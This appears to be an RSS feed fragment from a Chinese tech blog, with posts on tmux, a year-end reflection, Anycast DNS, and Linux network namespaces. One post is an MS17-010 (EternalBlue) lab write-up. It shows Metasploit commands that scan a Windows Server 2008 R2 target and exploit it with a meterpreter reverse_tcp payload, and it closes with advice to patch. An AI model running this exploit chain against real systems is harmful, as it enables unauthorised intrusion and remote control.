&lt;p&gt;　　tmux使用更简单，功能也更强大，当在tmux中工作的时候，即使关掉CRT的连接窗口，再次连接，进入tmux的会话之前的工作仍然在继续。&lt;/p&gt;

&lt;p&gt;　　tmux是一个linux下面的工具，在使用之前需要安装，配置使用&lt;a href=&quot;https://github.com/gpakosz/.tmux&quot;&gt;oh-my-tmux&lt;/a&gt;（取名类似oh-my-zsh）。&lt;/p&gt;

&lt;p&gt;　　tmux中有3种概念，会话(session)，窗口(window)，窗格(pane)。会话有点像是tmux的服务，在后端运行，可以通过tmux命令创建这种服务，并且可以通过tmux命令查看。一个session可以包含多个window，一个window可以被分割成多个pane。首先来看一下tmux的会话。&lt;/p&gt;

&lt;blockquote&gt;
  &lt;h3 id=&quot;tmux的session&quot;&gt;tmux的session&lt;/h3&gt;
&lt;/blockquote&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;tmux new -s mysession1&lt;/code&gt; 新建名为mysession1的会话&lt;br /&gt;
&lt;img src=&quot;https://user-images.githubusercontent.com/4729226/79189057-57e17480-7e53-11ea-911a-126c3fefd1a8.png&quot; alt=&quot;1&quot; /&gt;
可以看到进入session之后的显示，在下面有一条状态栏。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ctrl+b d&lt;/code&gt; 退出会话，回到shell的终端环境&lt;br /&gt;
当前在tmux的会话环境中，使用一个快捷键&lt;code class=&quot;highlighter-rouge&quot;&gt;ctrl+b d&lt;/code&gt;。&lt;br /&gt;
这里提一下，tmux 窗口有大量的快捷键。所有快捷键都要通过前缀键唤起。默认的前缀键是&lt;code class=&quot;highlighter-rouge&quot;&gt;Ctrl+b&lt;/code&gt;，oh-my-tmux新增了&lt;code class=&quot;highlighter-rouge&quot;&gt;Ctrl+a&lt;/code&gt;。举例来说，帮助命令的快捷键是&lt;code class=&quot;highlighter-rouge&quot;&gt;Ctrl+b ?&lt;/code&gt;。在后面的描述中，我们说的终端环境是指使用SecureCRT进入远程linux之后但是没有进入tmux的会话环境的状态。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;tmux ls&lt;/code&gt; 终端环境查看会话列表&lt;br /&gt;
在终端环境中执行&lt;code class=&quot;highlighter-rouge&quot;&gt;tmux ls&lt;/code&gt;&lt;br /&gt;
可以看到在列出的列表中，只有1行，说明只有一个session。 
&lt;img src=&quot;https://user-images.githubusercontent.com/4729226/79189704-0803ad00-7e55-11ea-9b5d-bf6ca1c5a138.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ctrl+b s&lt;/code&gt; 会话环境查看会话列表&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;tmux a -t mysession1&lt;/code&gt; 终端环境进入会话&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;tmux kill-session -t mysession1&lt;/code&gt;终端环境销毁会话&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;tmux rename -t old_session_name  new_session_name&lt;/code&gt; 终端环境重命名会话 
&lt;code class=&quot;highlighter-rouge&quot;&gt;ctrl + b $&lt;/code&gt;会话环境重命名会话&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;blockquote&gt;
  &lt;h3 id=&quot;tmux的window&quot;&gt;tmux的window&lt;/h3&gt;
&lt;/blockquote&gt;

&lt;p&gt;　　一个tmux的会话(session)中可以有多个窗口(window)，每个窗口又可以分割成多个pane(窗格)。工作的最小单位其实是窗格。默认情况下在一个window中，只有一个大窗格，占满整个窗口区域。&lt;/p&gt;

&lt;p&gt;　　参考之前新创建的会话中会默认创建一个窗口，名字是zsh，可以通过&lt;code class=&quot;highlighter-rouge&quot;&gt;crtl+b ,&lt;/code&gt; (前缀键之后按一个逗号)来修改当前窗口的名字。&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ctrl+b c&lt;/code&gt; 创建window&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;切换window&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;ctrl+b 1&lt;/code&gt; 切换到1号window，依次类推&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;ctrl+b w&lt;/code&gt; (windows的首字母) 列出当前session所有window，通过上、下键切换窗口&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ctrl+b &amp;amp; &lt;/code&gt; 关闭window 或者直接exit&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;blockquote&gt;
  &lt;h3 id=&quot;tmux的pane&quot;&gt;tmux的pane&lt;/h3&gt;
&lt;/blockquote&gt;

&lt;p&gt;　　这个是最好玩的了，tmux的一个window可以被分成多个pane(窗格)，可以做出分屏的效果。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/4729226/79191375-fe7c4400-7e58-11ea-8d45-81c4cb98ff68.png&quot; alt=&quot;3&quot; /&gt;&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ctrl+b %&lt;/code&gt; 垂直分屏&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;ctrl+b &quot;&lt;/code&gt; 水平分屏&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;切换pane&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;ctrl+b o &lt;/code&gt; 依次切换当前窗口下的各个pane&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;ctrl+b 上下左右&lt;/code&gt; 根据按箭方向选择切换到某个pane&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;ctrl+b Space(空格键)&lt;/code&gt; 对当前窗口下的所有pane重新排列布局，每按一次，换一种样式&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;ctrl+b z&lt;/code&gt; 最大化当前pane，再按一次后恢复&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ctrl+b x&lt;/code&gt; 关闭pane  或者直接exit&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;blockquote&gt;
  &lt;h3 id=&quot;tmux-window中的历史输出查看&quot;&gt;tmux window中的历史输出查看&lt;/h3&gt;
&lt;/blockquote&gt;

&lt;p&gt;　　在tmux里面，因为每个窗口的历史内容已经被tmux接管了。&lt;/p&gt;

&lt;p&gt;　　当我们在每 个tmux的window之间进行来回切换，来回操作，没有办法看到一个window里面屏幕上的历史输出，没办法使用鼠标滚动(例如在CRT中)查看之前的内容。&lt;/p&gt;

&lt;p&gt;　　如果要看当前窗口的历史内容，通过在当前的tmux window 按 &lt;code class=&quot;highlighter-rouge&quot;&gt;ctrl-b&lt;/code&gt;，然后就可以用PgUp/PgDn来浏览历史输出了，按q退出。&lt;/p&gt;
</description>
        <pubDate>Tue, 14 Apr 2020 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/2020-04-14/tmux-+-oh-my-tmux%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8C%97/</link>
        <guid isPermaLink="true">http://localhost:4000/2020-04-14/tmux-+-oh-my-tmux%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8C%97/</guid>
        
        <category>tmux</category>
        
        
        <category>Linux</category>
        
      </item>
    
      <item>
        <title>2019年终总结</title>
        <description>&lt;p&gt;　　又到年末，按照惯例是该来总结一下了。&lt;/p&gt;

&lt;p&gt;　　工作上马马虎虎，感觉上接触了很多新东西，比如了解了一个大型网站背后的架构、逻辑架构，基础设施和业务系统的分离，背后一期一期的工程实践。同时也意识到之前自己基础知识的不牢靠，越工作就越发觉大学时的理论知识的重要性。把工作做着走是很简单的事，难的是了解为什么要这么做？有没有更好的方法？遇到问题该怎么解决等等。当然，能学到多少东西全靠自己领悟了。&lt;/p&gt;

&lt;p&gt;　　IT虽然披着高科技的光鲜外衣，但当你真正掌握了基本的理论知识，本质上都是些很简单的东西，不然社会上就不会到处充斥着“软件工程师速成”、“零起点3个月通过CCIE”等形形色色的培训班了。不信试试三个月能否速成一下律师、证券从业者、或是临床医师？&lt;/p&gt;

&lt;p&gt;　　生活上我最大的感慨是实实在在的人到中年…需要保温杯里泡枸杞了…&lt;/p&gt;

&lt;p&gt;　　最近得了个小感冒+发烧，缓了快一个星期才恢复过来。以前这种小毛病估计连药都不用吃，现在天天药不能停。今年的体检报告也给我敲响了警钟。现在每周下班至少去3次健身房，希望2020能坚持下去。&lt;/p&gt;
</description>
        <pubDate>Thu, 09 Jan 2020 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/2020-01-09/2019%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</link>
        <guid isPermaLink="true">http://localhost:4000/2020-01-09/2019%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</guid>
        
        <category>年终总结</category>
        
        
        <category>水</category>
        
      </item>
    
      <item>
        <title>ms17-010渗透测试</title>
        <description>&lt;p&gt;主机工程师每天的一项日常工作就是给系统打各种补丁，我之前一直不以为然，认为这些补丁都可有可无。最近实践了下大名鼎鼎的ms17-010永恒之蓝，让我改变了这一想法。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/4729226/68555108-ee55d800-0466-11ea-8e6a-6d93d8481c54.png&quot; alt=&quot;漏洞&quot; /&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;主机：kali   192.168.106.242&lt;/p&gt;

  &lt;p&gt;靶机：Windows Server 2008 R2   192.168.106.240&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;永恒之蓝是以前玩剩下的了，现在Metasploit里面已经集成了17-010漏洞，渗透测试更加方便与正式化，内网中用17-010去测一测会发现意外惊喜。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/4729226/68555461-dd0dcb00-0468-11ea-89b7-5fcc0f92abbe.png&quot; alt=&quot;search&quot; /&gt;&lt;/p&gt;

&lt;p&gt;搜索到了4个相关的模块：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;auxiliary/admin/smb/ms17_010_command&lt;/li&gt;
  &lt;li&gt;auxiliary/scanner/smb/smb_ms17_010&lt;/li&gt;
  &lt;li&gt;exploit/windows/smb/ms17_010_eternalblue&lt;/li&gt;
  &lt;li&gt;exploit/windows/smb/ms17_010_psexec&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;先使用&lt;code class=&quot;highlighter-rouge&quot;&gt;auxiliary/scanner/smb/smb_ms17_010&lt;/code&gt;扫描可能含有ms17-010漏洞的服务器。&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf5 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; use auxiliary/scanner/smb/smb_ms17_010
msf5 auxiliary&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;scanner/smb/smb_ms17_010&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; show options

Module options &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;auxiliary/scanner/smb/smb_ms17_010&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:

   Name         Current Setting                                                 Required  Description
   &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;         &lt;span class=&quot;nt&quot;&gt;---------------&lt;/span&gt;                                                 &lt;span class=&quot;nt&quot;&gt;--------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;
   CHECK_ARCH   &lt;span class=&quot;nb&quot;&gt;true                                                            &lt;/span&gt;no        Check &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;architecture on vulnerable hosts
   CHECK_DOPU   &lt;span class=&quot;nb&quot;&gt;true                                                            &lt;/span&gt;no        Check &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;DOUBLEPULSAR on vulnerable hosts
   CHECK_PIPE   &lt;span class=&quot;nb&quot;&gt;false                                                           &lt;/span&gt;no        Check &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;named pipe on vulnerable hosts
   NAMED_PIPES  /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;List of named pipes to check
   RHOSTS                                                                       &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;The target address range or CIDR identifier
   RPORT        445                                                             &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;The SMB service port &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
   SMBDomain    &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;                                                               no        The Windows domain to use &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;authentication
   SMBPass                                                                      no        The password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;the specified username
   SMBUser                                                                      no        The username to authenticate as
   THREADS      1                                                               &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;The number of concurrent threads

msf5 auxiliary&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;scanner/smb/smb_ms17_010&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/4729226/68555634-9c628180-0469-11ea-8ad9-dd0df9bda69b.png&quot; alt=&quot;QQ截图20191111095648&quot; /&gt;&lt;/p&gt;

&lt;p&gt;可以看到靶机的ms17-010漏洞被扫描出来了。&lt;/p&gt;

&lt;p&gt;使用&lt;code class=&quot;highlighter-rouge&quot;&gt;exploit/windows/smb/ms17_010_eternalblue&lt;/code&gt;攻击，这里设置meterpreter的payload。&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf5 auxiliary&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;scanner/smb/smb_ms17_010&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; use exploit/windows/smb/ms17_010_eternalblue
msf5 exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;windows/smb/ms17_010_eternalblue&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;rhosts 192.168.106.240
rhosts &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; 192.168.106.240
msf5 exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;windows/smb/ms17_010_eternalblue&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;payload windows/x64/meterpreter/reverse_tcp
payload &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; windows/x64/meterpreter/reverse_tcp
msf5 exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;windows/smb/ms17_010_eternalblue&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;lhost 192.168.106.242
lhost &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; 192.168.106.242
msf5 exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;windows/smb/ms17_010_eternalblue&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; show options

Module options &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;exploit/windows/smb/ms17_010_eternalblue&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:

   Name           Current Setting  Required  Description
   &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;           &lt;span class=&quot;nt&quot;&gt;---------------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;--------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;
   RHOSTS         192.168.106.240  &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;The target address range or CIDR identifier
   RPORT          445              &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;The target port &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
   SMBDomain      &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;                no        &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Optional&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; The Windows domain to use &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;authentication
   SMBPass                         no        &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Optional&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; The password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;the specified username
   SMBUser                         no        &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Optional&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; The username to authenticate as
   VERIFY_ARCH    &lt;span class=&quot;nb&quot;&gt;true             yes       &lt;/span&gt;Check &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;remote architecture matches exploit Target.
   VERIFY_TARGET  &lt;span class=&quot;nb&quot;&gt;true             yes       &lt;/span&gt;Check &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;remote OS matches exploit Target.


Payload options &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;windows/x64/meterpreter/reverse_tcp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:

   Name      Current Setting  Required  Description
   &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;      &lt;span class=&quot;nt&quot;&gt;---------------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;--------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;
   EXITFUNC  thread           &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;Exit technique &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Accepted: &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;, seh, thread, process, none&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
   LHOST     192.168.106.242  &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;The listen address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;an interface may be specified&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
   LPORT     4444             &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;The listen port


Exploit target:

   Id  Name
   &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;
   0   Windows 7 and Server 2008 R2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;x64&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; All Service Packs

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/4729226/68555823-75587f80-046a-11ea-86c6-ff2cb296fa2b.png&quot; alt=&quot;攻击成功&quot; /&gt;&lt;/p&gt;

&lt;p&gt;exploit成功，接下来就可以为所欲为了~~&lt;/p&gt;

&lt;p&gt;所以说补丁还是得勤打，特别是永恒之蓝这种级别的漏洞，毕竟各大厂商不是吃白饭的。&lt;/p&gt;
</description>
        <pubDate>Mon, 11 Nov 2019 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/2019-11-11/ms17-010%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</link>
        <guid isPermaLink="true">http://localhost:4000/2019-11-11/ms17-010%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</guid>
        
        <category>渗透</category>
        
        <category>Linux</category>
        
        
        <category>Windows</category>
        
      </item>
    
      <item>
        <title>Anycast实现DNS高可用</title>
        <description>&lt;p&gt;最近在内网里搭建了一套 DNS 系统，2个节点在本地，2个节点在异地，采用的是 OSPF + Anycast 。&lt;/p&gt;

&lt;p&gt;一般来说 Anycast 是搭配 BGP的，路由层面来说 BGP 也比 OSPF 更好控制，但是我们的网络架构 CE 与 PE 之间采用的 OSPF 路由协议（MPLS-VPN），更改起来动作太大。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;来康康什么是 Anycast ：&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;先说结论：&lt;code class=&quot;highlighter-rouge&quot;&gt;Anycast 就是不同服务器用了相同的 ip 地址&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Anycast 本身是指 IPv6 中一个发送方和最近的一组接收方之间的通信。众所周知，IPv6 中是没有广播的，只有单播(Unicast)、组播(Multicast)和任播(Anycast)，Anycast 在 IPv4 中也同样适用。Anycast 本身就是多个主机使用同一个 ip 地址（该地址是这一组主机的共享单播地址）的一种技术，当发送方发送报文给这个共享单播地址时，报文会根据路由协议路由到这一组主机中离发送方最近的一台，所以这个技术也可以用来做负载均衡。&lt;/p&gt;

&lt;p&gt;在企业网络环境中，Anycast 不太常见，其主要应用于大范围的 DNS 部署，CDN，数据中心等。&lt;/p&gt;

&lt;p&gt;可能会有做企业网的朋友会有疑问，怎么能让互联网的多个主机用同一个 ip，这岂不是 ip 地址冲突了？&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;回答：&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;首先，每一个服务器主机处在不同的地理位置，他们之间不在同一个广播域内。所以把所有主机配置成相同的 ip 地址并不会引起我们日常所见的 ip 地址冲突。&lt;/p&gt;

&lt;p&gt;其次，光靠配置相同的地址是不够的，我们还需要借助路由协议帮忙。&lt;/p&gt;

&lt;p&gt;通过路由协议，各个站点向外宣告相同的 Anycast IP 地址。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;举个栗子：&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;通过配置4个 DNS 节点服务器的 Loopback 地址为相同 IP，例如1.1.1.1/32。然后服务器直接与CE路由器建立 OSPF 邻居，对外宣告1.1.1.0/27网段，这样PE就会学习到1.1.1.0/27。&lt;/p&gt;

&lt;p&gt;（注：为什么要宣告/27，而不是/32？那是因为上面有规定，为了减小VPN路由表，PE设备规定了只接受大于/8，小于等于/27的网段宣告进入骨干网。Internet 里也有类似规定）&lt;/p&gt;

&lt;p&gt;以上步骤完成后，骨干网里对1.1.1.1/27会有4个不同的出口路由器，客户端使用1.1.1.1作为DNS服务器，根据 OSPF 选择到最优路径。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;万一出故障怎么办：&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;如果 DNS 服务器中某几台出现故障，例如重庆的2台 DNS 服务器宕机，OSPF 协议会立即停止宣告此1.1.1.0/27的网段，路由表中只有异地的 DNS 可供选择，但是客户端是不会感知到，从而达到业务的平滑迁移和服务的高可用性，完全不需要人工干预。&lt;/p&gt;

&lt;p&gt;半夜12点，老王正在酣睡。突然一阵清脆的手机铃声响起，把老王从睡梦中拉回现实。&lt;/p&gt;

&lt;p&gt;“喂，谁啊？”&lt;/p&gt;

&lt;p&gt;“王工，我是监控中心的，公司的XXX服务器挂了，你赶紧看一下吧。”&lt;/p&gt;

&lt;p&gt;“不要慌，能自动切换的，该睡觉睡觉，该休息休息，明天上班再来处理！”&lt;/p&gt;

</description>
        <pubDate>Tue, 10 Sep 2019 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/2019-09-10/AnyCast%E5%AE%9E%E7%8E%B0DNS%E9%AB%98%E5%8F%AF%E7%94%A8/</link>
        <guid isPermaLink="true">http://localhost:4000/2019-09-10/AnyCast%E5%AE%9E%E7%8E%B0DNS%E9%AB%98%E5%8F%AF%E7%94%A8/</guid>
        
        <category>DNS</category>
        
        
        <category>网络</category>
        
      </item>
    
      <item>
        <title>Linux namespace</title>
        <description>&lt;p&gt;之前做过一段时间 docker 相关的工作，只能算熟悉相关命令，很多原理都似是而非。面试的时候被问过一个简单的问题：容器间资源的隔离是怎么实现的？当时只知道是靠 namespace ，但是具体实现不清楚。&lt;/p&gt;

&lt;p&gt;最近深入看了下 Linux namespace ，通过 network namespace 实验了 docker 的 bridge 网络。&lt;/p&gt;

&lt;p&gt;在每个容器中，我们都可以看到文件系统，网卡等资源，这些资源看上去是容器自己的。拿网卡来说，每个容器都会认为自己有一块独立的网卡，即使 host 上只有一块物理网卡。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;namespace 就是 Linux 内核用来隔离内核资源的方式。&lt;/strong&gt;通过 namespace 可以让一些进程只能看到与自己相关的一部分资源，而另外一些进程也只能看到与它们自己相关的资源，这两拨进程根本就感觉不到对方的存在。具体的实现方式是把一个或多个进程的相关资源指定在同一个 namespace 中。&lt;/p&gt;

&lt;p&gt;Linux namespaces 是对全局系统资源的一种封装隔离，使得处于不同 namespace 的进程拥有独立的全局系统资源，改变一个 namespace 中的系统资源只会影响当前 namespace 里的进程，对其他 namespace 中的进程没有影响。&lt;/p&gt;

&lt;p&gt;我们可以从 docker 实现者的角度考虑该如何实现一个资源隔离的容器。比如是不是可以通过 chroot 命令切换根目录的挂载点，从而隔离文件系统。为了在分布式的环境下进行通信和定位，容器必须要有独立的 IP、端口和路由等，这就需要对网络进行隔离。同时容器还需要一个独立的主机名以便在网络中标识自己。接下来还需要进程间的通信、用户权限等的隔离。最后，运行在容器中的应用需要有进程号(PID)，自然也需要与宿主机中的 PID 进行隔离。也就是说这六种隔离能力是实现一个容器的基础，让我们看看 linux 内核的 namespace 特性为我们提供了什么样的隔离能力：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/4729226/63321909-b0a84e00-c354-11e9-8179-ee7aca298e6e.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;

&lt;p&gt;这里我们就深入了解下network namespace：&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Network namespace 在逻辑上是网络堆栈的一个副本，它有自己的路由、防火墙规则和网络设备。&lt;/strong&gt; 默认情况下，子进程继承其父进程的 network namespace。也就是说，如果不显式创建新的 network namespace，所有进程都从 init 进程继承相同的默认 network namespace。&lt;/p&gt;

&lt;p&gt;每个新创建的 network namespace 默认有一个本地环回接口 lo，除此之外，所有的其他网络设备(物理/虚拟网络接口，网桥等)只能属于一个 network namespace。每个 socket 也只能属于一个 network namespace。&lt;/p&gt;

&lt;h3 id=&quot;ip-netns-命令&quot;&gt;ip netns 命令&lt;/h3&gt;
&lt;p&gt;ip netns 命令用来管理 network namespace。本文将使用 ip netns 命令来创建和操作 network namespace。(最近发现&lt;code class=&quot;highlighter-rouge&quot;&gt;ip&lt;/code&gt;比&lt;code class=&quot;highlighter-rouge&quot;&gt;ifconfig&lt;/code&gt;好用多了)&lt;/p&gt;

&lt;h3 id=&quot;创建-network-namespace&quot;&gt;创建 network namespace&lt;/h3&gt;

&lt;p&gt;先查看一下默认的 network namespace 的 ID：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/4729226/63323053-683e5f80-c357-11e9-9f1d-d382e7f39ea7.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;

&lt;p&gt;然后通过 ip netns add 命令创建名为 mynet 的 network namespace：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/4729226/63323179-ba7f8080-c357-11e9-8642-60d728246a39.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;

&lt;p&gt;从上图可以看出，在名为 mynet 的 network namespace 创建成功后，/var/run/netns 目录下多了一个名为 mynet 文件。ip netns exec 子命令可以在对应的 network namespace 中执行命令，下面我们就通过它在 mynet network namespace 中创建一个 bash 进程，并查看 network namespace 的 ID：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/4729226/63324843-7f7f4c00-c35b-11e9-9e91-91fd2fa52841.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;

&lt;p&gt;这是一个完全不同的 network namespace ID，而且默认shell也变了，说明当前的 bash 进程运行在一个隔离的 network 环境中。接下来让我们看看新的 network namespace 中都有什么：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/4729226/63324922-ac336380-c35b-11e9-9767-308b536ef4ec.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;

